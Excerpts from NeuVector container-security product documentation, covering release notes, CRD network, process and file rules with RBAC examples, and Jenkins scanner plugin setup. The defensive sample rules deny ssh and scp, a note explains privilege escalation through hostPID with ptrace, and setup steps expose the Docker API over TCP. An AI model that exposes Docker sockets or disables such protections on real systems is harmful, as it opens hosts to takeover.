violations for user created address group which uses wildcard in hostnames.  Helm Chart Changes​  Allow user to customize PriorityClass of the manager/controller/enforcer/scanner deployment. We suggest to give NeuVector containers higher priority to make sure the security policies get enforced when the node resource is under pressure or during a cluster upgrade process.Create a separate chart for CRD. This allows CRD policies to be created before NeuVector core services are deployed. If the new chart is used, the CRD resources in the core chart, kept for backward compatibility, should be disabled with crdwebhook.enabled=falseAllow user to specify the service account for NeuVector deployment. Previously, the 'default' service account of the namespace is used. In the case when NeuVector is deployed together with other applications in a namespace, it is not advisable to use the default service account for the namespace for some users.  4.0.2 December 2020​  Enhancements​  Console - the container list page Assets -&gt; Containers should allow the window separators to be dragged to be resized.Add admission control checks for pod share host namespaces. Allow user to choose to prevent pod from sharing host's Network, IPC, PID namespaces. See below for more details.Ability to export list of containers running in privileged or 'runasroot'.In Notifications -&gt; Security Events, enable the display of information about the event attributes easily without switching screens.  Bug Fixes​  Issue with jumbo frames (enabled on some public clouds). Symptom: the main prometheus application URI /graph becomes inaccessible when the prometheus group is placed into Protect mode.Missing namespace option in vulnerabilities filter. Allow users to select/type the Namespace where NeuVector is installed as filter entry.False positive in OpenSSL version 1.1.1c-1 affected by CVE-2020-1967.Unexpected implicit deny violations for user created address group using wildcard hostnames. Problems with using DNS Name (with wildcards) for Firewall Traffic.Improve detection to remove SQL Injection false positive.  Admission Control for Pod Sharing​  HostPID - Controls whether the pod containers can share the host process ID namespace. Note that when paired with ptrace this can be used to escalate privileges outside of the container (ptrace is forbidden by default).HostIPC - Controls whether the pod containers can share the host IPC namespace.HostNetwork - Controls whether the pod may use the node network namespace. Doing so gives the pod access to the loopback device, services listening on localhost, and could be used to snoop on network activity of other pods on the same node.  4.0.1 November 2020​  important Changes to Helm Chart Structure The directory for the NeuVector chart has changed from ./neuvector-helm/ to ./neuvector-helm/charts/core/ If using Helm to upgrade, please update the location to the path above.  Enhancements​  Add support for distroless image scanning.Add ability to trigger single image scan from registry with results available for admission control.Update JFrog Xray integration to new JFrog platform api / authentication requirements.Add information about scanners in the Manager such as version and scanner statistics.Add quick filter to exclude security events (similar to grep -v).Update CVE Severity to align with NVD vulnerability severity ratings. Using the larger of the CVSS v2 and v3 scores, the ratings are High for &gt;=7, Medium for &gt;=4.Support standalone scanner deployments for local image scanning (does not require controller). Adds new environment variables SCANNER_LICENSE, SCANNER_REGISTRY, SCANNER_REPOSITORY, SCANNER_TAG, SCANNER_REGISTRY_USERNAME, SCANNER_REGISTRY_PASSWORD, SCANNER_SCAN_LAYERS, CLUSTER_JOIN_ADDR, CLUSTER_JOIN_PORT.Support namespace auto-complete for namespace user creation in Settings -&gt; Users.Add ability to enter exempted CVEs in the Jenkins scanner plug-in.Add admission control criteria to be able to block images for which the scan failed to detect the OS (e.g. archlinux images) and therefore no vulnerabilities were found. A new criteria &quot;Image Without OS information&quot; is added, when set to true, means the base OS of the image is unavailable.  Bug Fixes​  Improve (decrease) Controller memory usage.Enable support for webhook functions such as admission control and CRD in Kubernetes 1.19.Add support for apiextensions.k8s.io/v1 deployments as required for Kubernetes 1.19 (and supported in k8s 1.18).Unexpected process profile rule violation resulting from parent shell script for process on the allowed list.Add support for wildcard filters in Harbor registry (configured using Docker registry setting).Improve handling of configmap to re-load if admin password is reverted to the default. This is to prevent insecure access when the system is recovered from cluster level storage failure.  4.0.0.s1 October 2020​  Security Patch for NeuVector Containers​  This security release is for the NeuVector Manager and Allinone containers to address High CVE-2020-14363 found in the base Alpine layer in package libx11. As part of the update, Medium CVE-2020-8927 is also addressed. This issue, although unlikely to be able to be exploited, affects the Manager console for NeuVector and does not affect the operations of the Controller or Enforcer containers.  4.0 September 2020​  Enhancements​  Customizable compliance templates. Preset templates for PCI, GDPR, HIPAA, NIST. Each CIS benchmarks and custom check can be tagged with one or more compliance regulations. Reports can then be generated for each. Security Risks -&gt; Compliance Profile.Vulnerability Management Workflow Support. Track status of vulnerabilities and create policies based on vulnerability discovery dates and other criteria. Security Risks -&gt; Vulnerabilities (Advanced Filter), and Admission Control rules.Secrets auditing. 20+ secrets checks included, and automatically run on image scans and resource yamls. Results will show pass/warn in the compliance reports on image vulnerabilities in Assets -&gt; Registries and Security Risks -&gt; Compliance.Granular RBAC for NeuVector Users. Create custom roles with granular read/write permissions for NeuVector functions. Assign users to roles. Settings -&gt; Users/Roles.Scalable and Separated Scanner Pods. Scanner pods can be scaled up or down to scan thousands of images. The controller assigns scanning tasks to each available scanner pod. Important: the Controller no longer contains a scanner function, so a minimum of one scanner pod is required to be deployed. Also, the 4.x scanners are NOT backward compatible with 3.x controllers, 3.x deployments of external scanners should be updated to neuvector/scanner:3.Serverless Scanning and Risk Assessment for AWS Lambda. Scan AWS Lambda functions for vulnerabilities with the Serverless IDE Plug-in or in AWS accounts. Supported languages include Java, Python, Ruby, node.js. Perform risk assessment by evaluating IAM role permissions for Lambda functions and alert if unnecessary permissions are enabled. Note: Serverless security requires a separate NeuVector license.Perform compliance checks during image scanning. Also deployment yamls file. This includes setuid, setgid, CIS (running as root etc), 20+ secrets checks.Enhance Security Risk Score in Dashboard with ability to enable/disable which Groups contribute to the Risk Score. Policy -&gt; Groups -&gt; Scorable check box. This includes ability to disable system containers from risk scoring.Added support for a Namespace restricted user to have access to assigned registries.Break out scanning syslog notifications to individual CVE syslog events.Allow a namespace restricted user to be able to create registries that are only visible by users that have access to that namespace (including global users).Download pdf reports from the dashboard by namespace. Select a namespace to filter the dashboard pdf report.The CRD import behavior has been changed to ignore the PolicyMode of any 'linked' group, leaving the Policy mode unchanged if the linked group already exists. If the linked group does not exist it will be automatically created and set to the default New Services Mode in Settings -&gt; Configuration. A 'linked' group is one which has not been selected for export but is referred to by a network rule, and thus has been exported along with the selected group(s).  Bug Fixes​  Registry URL validation allows URL without protocol scheme prefix. Added protocol schema validation.Container scans failed - Fail to read files in some situations. Fixes error &quot;Failed to read file - error=&lt;nil&gt;&quot;.The Group member column is inaccurate for the special group &quot;nodes.&quot;Discount (reduce) Admission Controls (4 points) from Overall Risk Scoring for Docker EE Platform since it is not applicable.A scanner only controller can take 15-20 minutes to become ready.Security risks &gt; Vulnerabilities &quot;Severity&quot; Distribution title is mislabeled as Urgency.Security Events source Workload:ingress rule does not match. Unexpected implicit violation from Workload:Ingress on OpenShift 3.11 platform. Internal subnet logic is improved to handle large IP range.Enforcer reports error trying to connect to /var/run/docker.sock. Add recovery if connection is lost.  Summary of Major Operational Changes​  The 4.x Scanner is NOT compatible with the 3.2.0, 3.2.1, 3.2.2 Controllers. If you have deployed 3.x external scanners and wish to have them continue to run, be sure to UPDATE the scanner deployment with a version 3 tag, e.g. neuvector/scanner:3.

Certificate for JWT-signing is created automatically by controller with validity of 90days and rotated automatically.Auto-generation of Manager, REST API, and registry adapter certificate requires using Helm-based install using NeuVector helm version 2.6.3 or later.Built-in certificate is still used for yaml based deployments if not replaced during deployment; however, it is recommended to replace these (see next line).Manual replacement of certificate is still supported and recommended for previous releases or yaml based deployments. See the NeuVector GitHub security advisory here for a description.Use of user-supplied certificates is still supported as before for both Helm and yaml based deployments. Add additional controls on custom compliance scripts. By default, custom script are now not allowed to be added, unless the environment variable CUSTOM_CHECK_CONTROL is added to Controller and Enforcer. Values are &quot;disable&quot; (default, not allowed), &quot;strict&quot; (admin role only), or &quot;loose&quot; (admin, compliance, and runtime-policy roles).Prevent LDAP injection - username field is escaped.  Enhancements​  Add additional scan data to CVE results sent by SYSLOG for layered scansSupport NVD API 2.0 for scan CVE databaseProvide container image build date in Assets -&gt; Container detailsAdjust sorting for Network rules: disable sorting in Network rules view but enable sorting of network rules in Group view.Enable/disable TLS 1.0 and TLS 1.1 detection/alerting with environment variables to Enforcer THRT_SSL_TLS_1DOT0, THRT_SSL_TLS_1DOT1. Disabled by default.Add environment variable AUTO_PROFILE_COLLECT for Controller and Enforcer to assist in capturing memory usage when investigating memory pressure events. Set value = 1 to enable.Configuration assessments against Admission Control should show all violations with one scan.Add more options for CVE report criteria in Response Rules. Example 1 - &quot;cve-high-with-fix:X&quot; means: When # of (high vulnerability that have been fixed) &gt;= X, trigger the response rule. Example 2 - &quot;cve-high-with-fix:X/Y&quot; means: When # of (high vulnerability that were reported Y days ago &amp; have been fixed) &gt;= X, trigger the response rule.

See Settings -&gt; User, API Keys... to create a new API key. Keys can be set to default or custom roles.Support AWS Marketplace PAYG billing for NeuVector monthly support subscriptions. Users can subscribe to NeuVector by SUSE support, billed monthly to their AWS account based on previous month's average node count usage. Details here.Support image signing for admission controls. Users can require NeuVector to verify that images are signed by specific parties before they can be deployed into the production environment, through an integration with Sigstore/Cosign. See Assets -&gt; Sigstore Verifiers for creating new signature assets. Rules can then be created with criteria Image Signing and/or Image Sigstore Verifiers.Enable each admission control rule to have its own mode of Monitor or Protect. A Deny action in Monitor mode will alert, and a Deny action in Protect mode will block. Allow actions are unaffected.Add a new regex operator in Policy &gt; Admission Control &gt; Add Rule for Users and User Groups to support regex. Support operators &quot;matches ANY regex in&quot; and &quot;matches NONE regex in&quot;.Add support for admission control criteria such as resource limits. A new criteria is added for Resource Limits, and additional criteria are supported through the Custom Criteria settings.Support invoking NeuVector scanner from Harbor registries through the pluggable scanner interface. This requires configuration of the connection to the controller (exposed API). The Harbor adapter calls controller endpoint to trigger a scan, which can scan automatically on push. Interrogation services can be used for periodic scans. Scan results from Federation Primary controllers ARE propagated to remote clusters. NOTE: There is an issue with the HTTPS based adapter endpoint error: please ignore Test Connection error, it does work even though an error is shown (skip certificate validation).Searchable SaaS service for CVE lookups.

This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.Compliance containers list to exclude exited containers.Enhance DLP rules to support simple wildcard in the pattern.Add support for cri-o 1.26+ and OpenShift 4.11+.Make gravatar optional.Display cluster namespace resource in console / UI.Display source severity/classification (e.g. Red Hat, Ubuntu...) along with NVD severity score in console.Don’t allow SSO/RBAC disabling for Rancher and OpenShift if user is authenticated through SSO.Add auto-scan enablement and deletion of unused groups aging to configMap.Include IP address for external source/destination in csv/pdf for implicit deny violationsVarious performance and scalability optimizations for controller and enforcer CPU and memory usage.  Bug Fixes​  Fix application slowness on GKE Container Optimized OS (COS) nodes when in Protect mode.SUSE Linux (SLES) 15.4 CVE not matching in scanner. With this fix, if the severity is provided in the feed, the vulnerability will be added to the database, even if the NVD record is missing. It is possible that the report includes vulnerabilities without CVE scores.  Other​  Enhance Admission Control CRD options in helm https://github.com/neuvector/neuvector-helm/pull/237.Add new enforcer environment variables to helm chart.  5.1.1 February, 2023​  Enhancements​  Add “package” as information to the syslog-event for a detected vulnerability.Add Enforcer environment variable ENF_NETPOLICY_PULL_INTERVAL - Value in seconds (recommended value 60) to reduce network traffic and resulting resource consumption by Enforcer due to policy updates/recalculations.

The primary (master) cluster can scan a registry/repo designated as a federated registry. The scan results from these registries will be synchronized to all managed (remote) clusters. This enables display of scan results in the managed cluster console as well as use of the results in admission control rules of the managed cluster. Registries only need to be scanned once instead of by each cluster, reducing CPU/memory and network bandwidth usage.Enhance admission control rules: Custom criteria for admission control rules. Allow users to define resource criteria on all pod related fields and to be used in rules, for example item.metadata.annotationsKey contains 'neuvector', item.metadata.name='xyzzy' etc.Add criteria to check for high risk RBAC settings for service accounts when deploying pods. These include criteria 'any action of workload resources', 'any action on RBAC', 'create workload resources', 'listing secrets', and 'exec into a container'.Add semantic version comparison to modules for admission control rules. This enables &gt; or &lt; operators to applied to version numbers in rules (e.g. don't allow module curl&lt;6.2.0 to be deployed). This allows specific version checks on installed packages.Add an admission control rule for Pod Security Admission (PSA) supported in Kubernetes 1.25+. Add new env variable NO_DEFAULT_ADMIN which when enabled does not create an 'admin' user. This is used for Rancher SSO integration as the default. If not enabled, persistently warn the user and record events to change the default admin password if it is not changed from default.Blocking login after failed login attemps now becomes the default. The default value is 5 attempts, and configurable in Settings -&gt; Users &amp; Roles-&gt; Password Profile.Add new env variable for performance tuning ENF_NO_SYSTEM_PROFILES, value: &quot;1&quot;. When enabled, it will disable the process and file monitors. No learning processes, no profile modes, no process/file (package) incidents, and no file activity monitor will be performed. This will reduce CPU/memory resource usage and file operations.Add a custom auto-scaling setting for scanner pods, with value Delayed, Immediate, and Disabled. Important: Scanner auto-scaling is not supported when scanner is deployed with an OpenShift operator, as the operator will always change the number of pods to its configured value. Delayed strategy: When lead controller continuously sees &quot;task count&quot; &gt; 0 for &gt; 90 seconds, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Immediate strategy: Every time when lead controller sees &quot;task count&quot; &gt; 0, a new scanner pod is started if maxScannerPods is not reached yetWhen lead controller continuously sees &quot;task count&quot; is 0 for &gt; 180 seconds, it scales down one scanner pod if minScannerPods is not reached yet Custom groups are now able to use namespace labels, including Rancher's namespace labels. Generally, pod and namespace labels can now be added to Custom Groups.Add ability to hide selected namespaces, groups in Network Activity view.Full support for Cilium cni.Full support of OpenShift 4.9 and 4.10.Build tools are now available for the NeuVector/Open Zero Trust (OZT) project at https://github.com/openzerotrust/openzerotrust.io.NeuVector now lists the version ID and SHA256 digest for each version of the controller, manager, enforcer at https://github.com/neuvector/manifests/tree/main/versions.Anonymous telemetry data (number of nodes, groups, rules) is now reported to a Rancher cloud service upon deployment to assist the project team in understanding usage behavior. This can be disabled (opt-out) in UI or with configMap (No_Telemetry_Report) or REST API.(Addendum January 2023). Support for ServiceEntry based network policy with Istio. Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. IMPORTANT: If you are upgrading to v5.1 with an Istio based deployment, new rules must be created to allow these connections and avoid violation alerts. After upgrading, Implicit violations will get reported for newly visible traffic if allow rules don't exist. New traffic rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with addresses (or DNS name) and new network rule to this destination to allow the traffic. NOTE: There is a bug in 5.1.0 in the destination reported by the deny violations that do not represent the correct destination. The bug reports both server_name and client_name are the same. This issue will get addressed in an upcoming patch release.  Bug Fixes​  Reduce controller memory consumption from unnecessary cis benchmark data created during rolling updates.

Monitor to Protect criterion: There are no security events (network, process etc) for the timeframe set for the Group.Support for Rancher 2.6.5 Apps and Marketplace chart. Deploys into cattle-neuvector-system namespace and enables SSO from Rancher to NeuVector. Note: Previous deployments from Rancher (e.g. Partner catalog charts, version 1.9.x and earlier), must be completely removed in order to update to the new chart.Support scanning of SUSE Linux (SLE, SLES), and Microsoft MarinerZero-drift process and file protection. This is the new default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.Split policy mode protection for network, process/file. There is now a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.WAF rule detection, enhanced DLP rules (header, URL, full packet). Used for ingress connections to web application pods as well as outbound connections to api-services to enforce api security.CRD for WAF, DLP and admission controls.

Developers, DevOps, DevSecOps, and Security teams can collaborate to automate security policies for new or updated applications deployed to production. CRDs can also be used to enforce global security policies across multiple Kubernetes clusters.  note CRDs are supported in Kubernetes 1.11 and later. Deploying the NeuVector security rule CRD in earlier versions may not result in an error, but the CRD will not be processed.  CRD's can be used to support many use cases and workflows:  Define security policy during application development, to push into production.Learn behavior using NeuVector and export the CRD for review before pushing into production.Migrate security policies from staging to production clusters.Replicate rules across multiple replicated clusters in hybrid or multi-clouds.Enforce global security policies (see examples for this at bottom).  CRD's bring many benefits, including:  Define / declare the security policy, as code.Version and track the security policies the same as application deployment manifests.Define the allowed behavior of any application including network, file and process behavior.  Supported Resource Types​  NeuVector supports two kinds of custom resource definitions. They are the NvSecurityRule and NvClusterSecurityRule. The difference among the two comes down to the boundary set by the definition of the scope. The NvSecurityRule resource is scoped at the namespace level, whereas the NvClusterSecurityRule is scoped at the cluster level. Either of the resource types can be configured in a yaml file and can be created during deployment, as shown in the deployment instructions and examples for NeuVector.  The significance of the NvSecurityRule resource type with a scope of namespace lies in the enforcement of the configured domain of the target group, which must match the configured namespace in the NeuVector’s CRD security policy. This provides enforcement to prevent unwanted cross-namespace policy creation which affect a Target-Group policy rule.  For the NvClusterSecurityRule custom resource definition, this has a cluster level scope, and therefore, does not enforce any namespace boundary on a defined target. However, the user-context that is used for importing the CRD-yaml file must have the necessary permissions to access or reside in the same namespace as the one configured in the CRD-yaml file, or the import will be rejected.  Enabling CRD SupportAs described in the Kubernetes and OpenShift deployment sections (Deploying NeuVector), the appropriate clusterroles and clusterrole bindings for custom resources and NvSecurityRules should be added first.  Then NvSecurityRule and NvClusterSecurityRule should be created using the sample yaml in those sections. NeuVector CRDs can now be deployed.

After you have tested your application while NeuVector is in Discover mode learning the network, file, and process behavior, you can export the learned policy.  Go to the Policy -&gt; Groups menu and click on Export Group Policy from the upper right.    Then select the Groups that you wish to export, such as the three in the demo namespace above. Inspect the saved CRD yaml below to see how the NeuVector network, process, and file rules are expressed.  note In addition to the selected group(s), all 'linked' groups will also be exported.

This configured Namespace is then used to enforce the configured Target, which must reside in this namespace configured in the NeuVector security policy. When rolebinding a defined clusterrole, this can be used to bind to a Kubernetes User or Group. The two clusterrole resources types that NeuVector supports are NvSecurityRule and NvClusterSecurityRule.  Rolebinding &amp; Clusterolebinding with 2 Users in different Namespaces to a Clusterrole (NvSecurityRules &amp; NvClusterSecurityRules resources)  The following illustrates a scenario creating one Clusterrole containing both resources (NvSecurityRules and NvClusterSecurityRules) to be bound to two different users.  One user (user1) belongs to Namespace (ns1), while the other user (user2) belongs to Namespace (ns2). User1 will Rolebind to this created Clusterrole (nvsecnvclustrole), while User2 is Clusterrolebind to this same Clusterrole (nvsecnvclustrole).  The key takeaway here is to illustrate that using Rolebinding, this will have Namespace-Level-Scope, whereas using Clusterrolebinding will have Cluster-Level-Scope. User1 will Rolebind (Namespace-Level-Scope), and User2 will be Clusterrolebind (Cluster-Level-Scope). This matters most during RBAC enforcement based on the scope-level that bounds the created users access.  Example using 2 different types of defined yaml files, and the effect of using each user  Create a Clusterrole containing both NvSecurityRules and NvClusterSecurityRules resources. Note: Notice that this clusterrole has 2 resources configured, nvsecurityrules and nvclustersecurityrules. Example (nvsecnvclustroles.yaml):  apiVersion: rbac.authorization.k8s.io/v1 kind: ClusterRole metadata: name: nvsecnvclustrole rules: - apiGroups: - neuvector.com resources: - nvsecurityrules - nvclustersecurityrules verbs: - list - delete - create - get - update - apiGroups: - apiextensions.k8s.io resources: - customresourcedefinitions verbs: - get - list   Create 2 test yaml-files. One for the NvSecurityRules, and the other for the NvClusterSecurityRules resource. Sample NvSecurityRules nvsecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1crd namespace: ns1 spec: target: selector: name: nv.nginx-pod.ns1 criteria: - key: service value: nginx-pod.ns1 op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: domain value: demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Sample NvClusterSecurityRules nvclustersecurity.yaml file:  apiVersion: neuvector.com/v1 kind: NvClusterSecurityRule metadata: name: rbacnvclustmatchnamespacengtargserving namespace: nvclusterspace spec: target: policymode: Protect selector: name: nv.nginx-pod.eng criteria: - key: service value: nginx-pod.eng op: &quot;=&quot; - key: domain value: eng op: &quot;=&quot; ingress: - selector: name: ingress criteria: - key: service value: nginx-pod.demo op: &quot;=&quot; ports: &quot;tcp/65535&quot; applications: - SSL action: allow name: ingress   Switching the user-context to user1 (belongs to the ns1 Namespace) has a Rolebind to the NvSecurityRules resource, who is Namespace bound to the Namespace ns1. Therefore, importing test yaml file (kubectl create –f nvsecurity.yaml should be allowed since this yaml file configuration has the NvSecurityRules resource and the Namespace that this user is bound to.  If there is an attempt to import the test yaml file (nvclustersecurity.yaml ) however, this will be denied since the import CRD yaml file is defined with the resource NvClusterSecurityRules that has a Cluster-Scope, but user1 was Rolebind with a Namespace-Scope. Namespace-scope has a lower privilege than Cluster-Scope. Therefore, Kubernetes RBAC will deny such a request.  Example Error Message:  Error from server (Forbidden): error when creating &quot;rbacnvclustnamespacengtargnvclustingress.yamltmp&quot;: nvclustersecurityrules.neuvector.com is forbidden: User &quot;user1&quot; cannot create resource &quot;nvclustersecurityrules&quot; in API group &quot;neuvector.com&quot; at the cluster scope   Next, we can switch the user-context to user2 with a broader scope privilege, cluster-level-scope. This user2 has a Clusterrolebinding that is not Namespace bound, but has a cluster-level-scope, and associates with the NvClusterSecurityRules resource.  Therefore, using user2 to import either yaml file (nvsecurity.yaml or nvclustersecurity.yaml) will be allowed, since this user’s Clusterrolebinding is not restricted to either resource NvSecurityRules (Namespace-Scope) or NvClusterSecurityRules (Cluster-Scope).

Each network rule in NeuVector must have a unique name in a CRD. Note that in the console, network rules only have a unique ID number.  If the 'To' (destination) of the rule is a learned, discovered group, upon export NeuVector prepends the 'nv.' identifier to the name. For example &quot;nv.redis-master.demo-ingress-0&quot;. For both discovered and custom groups, NeuVector also appends a unique name identifier, such as '-ingress-0' in the rule name 'nv.redis-master.demo-ingress-0. For CRD rule names, the 'nv.' identifier is NOT required, and is added to exported rules for clarity. For example:   ingress: - action: allow applications: - Redis name: nv.redis-master.demo-ingress-0   Custom, user created groups are not allowed to have the 'nv.' prefix. Only discovered/learned groups with the domain and service objects should have the prefix.

There are multiple benefits to allow these customizations.  First, this allows the same rules to be applied on multiple Kubernetes environments, allowing synchronization among clusters.Second, this allows preemptive rules deployment prior to the applications coming online, which provides a proactive and effective security rules deployment workflow.Third, this allows the policymode to change from an evaluation one (such as Discover or Monitor), to one that protects the final staging environment.  These CRD rules within a yaml file can be imported into the NeuVector security platform through the use of Kubernetes CLI commands such as 'kubectl create –f crd.yaml'. This empowers the security team to tailor the security rules to be applied upon various containers residing in the Kubernetes environment.  For example, a particular yaml file can be configured to enable the policymode to Discover or Monitor a particular container named nv.alpine.ns1 in a staging cluster environment. Moreover, you can limit ssh access for a configured target container nv.alpine.ns1. to another container nv.redhat.ns2.  Once all the necessary tests and evaluations of such security rules are deemed correct, then you can migrate this to a production cluster environment simultaneous to the application deployments by using the NeuVector policy migration feature, which will be discussed later in this section.  Examples of CRD configurations that perform these functions  The following is a sample snippet of such configurations  apiVersion: neuvector.com/v1 kind: NvSecurityRule metadata: name: ns1global namespace: ns1 #The target's native namespace spec: target: selector: name: nv.alpine.ns1 criteria: - key: service value: alpine.ns1 #The source target's running container op: &quot;=&quot; - key: domain value: ns1 op: &quot;=&quot; egress: - selector: name: egress criteria: - key: service value: nv.redhat.ns2 #The destination's running container op: &quot;=&quot; ports: tcp/22 #Denies ssh to the destination container nv.redhat.ns2 applications: - SSH action: deny name: egress file: #Applies only to the defined target container group - app: - chmod #The application chmod is the only application allowed to access, while all other apps are denied. behavior: block_access #Supported values are block_access and monitor_change.

This should be allowed if the intent is to allow the file access rule to take effect. name: chmod # This configured should match the application defined under the file section. path: /bin/chmod   The above snippet is configured to enforce ssh access from the target group container nv.alpine.ns1 to the egress group nv.redhat.ns2. In addition, the enforcement of file access and the process rules are defined and applied to the configured target container nv.alpine.ns1. With this bundled configuration, we have allowed the defined network, file, and process security rules to act upon the configured target group.

It has an ingress policy that does not allow any external connections (outside your cluster) to ssh into your containers. It also denies all containers from using the ssh process. This defined global behavior applies to all containers. The second part is a NvSecurityRule for alpine services: The target is a service called nv.alpine.default in the 'default' namespace. Because it belongs to the all containers, it will inherit the above network policy and process rule. It also adds rules that don't not allow connections of HTTP traffic through port 80 to an external network. Also it not allow the running of the scp process.  Note that for service nv.alpine.default (defined as nv.xxx.yyy where xxx is the service name like alpine, yyy is the namespace like default) we can define policy mode that it is set to. Here it is defined as Protect mode (blocking all abnormal activity).  Overall since nv.alpine.defult is in protect mode, it will deny containers from running ssh and scp, and also will deny ssh connections from external or http to external.

To trigger a build-phase scan, the plug-in (e.g. Jenkins) must be able to connect to the Controller or Allinone. Note: The default REST API port for plug-ins to call the scanner is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.

But container images may contain open source code over which you don't have a full control. Many vulnerabilities in open source projects have been reported, and you may decide to use these libraries with vulnerabilities or not after scanning the images and reviewing the vulnerability information for them.  The NeuVector Vulnerability Scanner Jenkins plugin can scan the images after your image is built in Jenkins. The plug-in source and latest documentation can be found here on the NeuVector GitHub page.  The plug-in supports two scan modes. The first is &quot;Controller &amp; Scanner&quot; mode. The second is the standalone scanner mode. You can select the scan mode in the project configuration page. By default, it uses the &quot;Controller &amp; Scanner&quot; mode.  For the &quot;Controller &amp; Scanner&quot; mode, you need to deploy the NeuVector controller and scanner in the network. To scan the local image (the image on the Jenkins machine), the &quot;Controller &amp; Scanner&quot; needs to be installed on the same node where the image exists.  For the standalone scanner mode, the Docker run-time must be installed on the same host with Jenkins. Also, add the jenkins user to the docker group.  sudo usermod -aG docker jenkins   Jenkins Plugin Installation​  First, go to Jenkins in your browser to search for the NeuVector plug-in. This can be found in:  -&gt; Manage Jenkins -&gt; Manage Plugins -&gt; Available -&gt; filter -&gt; search NeuVector Vulnerability Scanner -&gt;  Select it and click `install without restart.'  Deploy the NeuVector Controller and Scanner container if you haven't already done so on a host reachable by the Jenkins server. This can be on the same server as Jenkins if desired. Make a note of the IP address of the host where the Controller is running. Note: The default REST API port is 10443. This port must be exposed through the Allinone or Controller through a service in Kubernetes or a port map (e.g. - 10443:10443) in the Docker run or compose file.  In addition, make sure there is a NeuVector scanner container deployed standalone and configured to connect to the Controller (if Controller is being used).  There are two scenarios for image scanning, local and registry scanning.  Local Image Scan. If you use the plugin to scan local images (before pushing to any registries), you can scan on the same host as the controller/scanner or configure the scanner to access the docker engine on a remote host.Registry Image Scan. If you use the plugin to scan registry images (after pushing to any registries, but as part of the Jenkins build process), the NeuVector Scanner can be installed on any node in the network with connectivity between the registry, NeuVector Scanner, and Jenkins.  Global Configuration in Jenkins​  After installing the plugin, find the ‘NeuVector Vulnerability Scanner’ section in the global configuration page (Jenkins ‘Configure System’). Enter values for the NeuVector Controller IP, port, username, and password. You may click the ‘Test Connection’ button to validate the values. It will show ‘Connection Success’ or an error message.  The timeout minutes value will terminate the build step within the time entered. The default value of 0 means no timeout will occur.  Click the ‘Add Registry’ to enter values for the registry you will use in your project. If you will be only scanning local images, you don’t need to add a registry here.  Scenario 1: global configuration example for local image scan    Scenario 2: global configuration example for registry image scan  For global registry configuration, follow the instructions above for local, then add the registry details as below.    Standalone Scanner​  Running Jenkins scan in standalone mode is a lightweight way to scan image vulnerabilities in the pipeline. Scanner is dynamically invoked and no installaton of controller setup is required. This is especially useful when scaning an image before it is pushed to a registry. It also has no limit on how many scan tasks can run at the same time.  In order to run vulnerability scan in standalone mode, the Jenkins plugin need pull the scanner image to the host where the agent is running, so you need enter NeuVector Scanner registry URL, image repository, and the credential if needed, in NeuVector plugin configuration page.  The scan result can also be submitted to the controler and used in the admission control function. In this case, you do need a controller setup and specify how to connect to the controller in NeuVector plugin configuration page.  Local Configuration for scanning a remote Docker Host​  Prerequisites for Local Scan on a Remote Docker HostTo enable NeuVector to scan an image that is not on the same host as the controller/allinone:  Make sure the docker run-time api socket is exposed via TCPAdd the following environment variable to the controller/allinone: SCANNER_DOCKER_URL=tcp://192.168.1.10:2376  Project Configuration​  In your project, choose the 'NeuVector Vulnerability Scanner' plugin from the drop down menu in the 'Add build step.' Check the box &quot;Scan with Standalone scanner&quot; if you want to do the scan in the standalone scanner mode. By default, it uses &quot;Controller &amp; Scanner&quot; mode to do the scan.  Choose Local or a registry name which is the nickname you entered in global config. Enter the repository and image tag name to be scanned. You may choose Jenkins default environment variables for the repository or tag, e.g. $JOB_NAME, $BUILD_TAG, $BUILD_NUMBER. Enter the values for the number of high or medium, and for any name of the vulnerabilities present to fail the build.  After the build is finished, a NeuVector report will be generated. It will show the scan details and errors if any.  Scenario 1: local configuration example    Scenario 2: registry configuration example    Jenkins Pipeline​  For the Jenkins pipeline project, you may write your own pipeline script directly, or click the ‘pipeline syntax’ to generate the script if you are new to the pipeline style task.    Select the NeuVector Vulnerability Scanner from the drop-down, configure it, and Generate the script.    Copy the script into your Jenkins task script.  Scenario 1: Simple local pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'Local', repository: 'your_username/your_image' \\} ...   Scenario 2: Simple registry pipeline script example (to insert into your pipeline script):  ... stage('Scan local image') \\{ neuvector registrySelection: 'your_registry', repository: 'your_username/your_image' \\} ...   Additional Stages​  Add your own pre- and post- image scan stages, for example in the Pipeline stage view example below.

